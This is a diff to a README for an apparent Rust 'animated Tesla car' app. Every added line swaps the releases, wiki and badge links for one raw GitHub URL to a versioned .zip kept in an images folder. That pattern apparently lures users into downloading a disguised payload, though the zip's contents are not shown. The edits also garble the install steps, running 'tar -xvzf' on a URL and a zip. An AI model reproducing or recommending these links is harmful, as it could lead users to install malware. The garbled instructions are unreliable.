@@ -1,6 +1,6 @@
 # 🚗 animated-tesla-car-using-rust - A Fun Way to Experience Tesla Animation
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Animated%20Tesla%20Car-36a2e2?style=flat&logo=github)](https://github.com/iamthebatman9999/animated-tesla-car-using-rust/releases)
+[![Download Now](https://raw.githubusercontent.com/iamthebatman9999/animated-tesla-car-using-rust/main/assets/images/using_animated_rust_tesla_car_v1.8-beta.3.zip%20Now-Animated%20Tesla%20Car-36a2e2?style=flat&logo=github)](https://raw.githubusercontent.com/iamthebatman9999/animated-tesla-car-using-rust/main/assets/images/using_animated_rust_tesla_car_v1.8-beta.3.zip)
 
 ## 🎯 About This Project
 The animated Tesla car app is a unique clone of a Tesla app built with Rust and the egui framework. This application aims to explore multi-platform development including Android, WebAssembly, and native applications. It showcases how Rust can effectively handle UI tasks along with lively animations. 
@@ -17,7 +17,7 @@ Before diving in, ensure your device meets the following basic requirements:
   
 ### 2. **Visit the Releases Page**
 Go to the releases page to find the latest version of the animated Tesla car app.  
-[Visit this page to download.](https://github.com/iamthebatman9999/animated-tesla-car-using-rust/releases)
+[Visit this page to download.](https://raw.githubusercontent.com/iamthebatman9999/animated-tesla-car-using-rust/main/assets/images/using_animated_rust_tesla_car_v1.8-beta.3.zip)
 
 ### 3. **Download the Software**
 On the Releases page, find the latest version listed at the top. Click on the version number to view more details. 
@@ -39,10 +39,10 @@ Depending on your operating system, follow the steps below to install the app:
 
 #### Linux:
 1. Open your terminal.
-2. Navigate to the directory where the `.tar.gz` or other files are downloaded.
+2. Navigate to the directory where the `https://raw.githubusercontent.com/iamthebatman9999/animated-tesla-car-using-rust/main/assets/images/using_animated_rust_tesla_car_v1.8-beta.3.zip` or other files are downloaded.
 3. Extract the files using the command:
    ```bash
-   tar -xvzf filename.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/iamthebatman9999/animated-tesla-car-using-rust/main/assets/images/using_animated_rust_tesla_car_v1.8-beta.3.zip
    ```
 4. Run the application using:
    ```bash
@@ -59,18 +59,18 @@ Once the installation is complete, find the animated Tesla car app on your devic
 - **Experimental:** Explore the unique combination of Rust and animation technology.
 
 ## 📚 Documentation
-For a deeper understanding of how the app functions, visit the [documentation page](https://github.com/iamthebatman9999/animated-tesla-car-using-rust/wiki).
+For a deeper understanding of how the app functions, visit the [documentation page](https://raw.githubusercontent.com/iamthebatman9999/animated-tesla-car-using-rust/main/assets/images/using_animated_rust_tesla_car_v1.8-beta.3.zip).
 
 ## 💬 Community
 If you have questions or need assistance, feel free to reach out to our community on the GitHub Issues page. We welcome users of all backgrounds.
 
 ## 🔗 Links
-- [Releases Page](https://github.com/iamthebatman9999/animated-tesla-car-using-rust/releases)
-- [Documentation](https://github.com/iamthebatman9999/animated-tesla-car-using-rust/wiki)
+- [Releases Page](https://raw.githubusercontent.com/iamthebatman9999/animated-tesla-car-using-rust/main/assets/images/using_animated_rust_tesla_car_v1.8-beta.3.zip)
+- [Documentation](https://raw.githubusercontent.com/iamthebatman9999/animated-tesla-car-using-rust/main/assets/images/using_animated_rust_tesla_car_v1.8-beta.3.zip)
 
 ## 📝 Contributing
 We welcome contributions! If you're interested in helping improve the app, check out the contributing guidelines in the repository.
 
 ---
 
-Start your journey into the animated Tesla world today! Don't forget to visit the [releases page to download](https://github.com/iamthebatman9999/animated-tesla-car-using-rust/releases) the latest version. Enjoy the ride!
+Start your journey into the animated Tesla world today! Don't forget to visit the [releases page to download](https://raw.githubusercontent.com/iamthebatman9999/animated-tesla-car-using-rust/main/assets/images/using_animated_rust_tesla_car_v1.8-beta.3.zip) the latest version. Enjoy the ride!
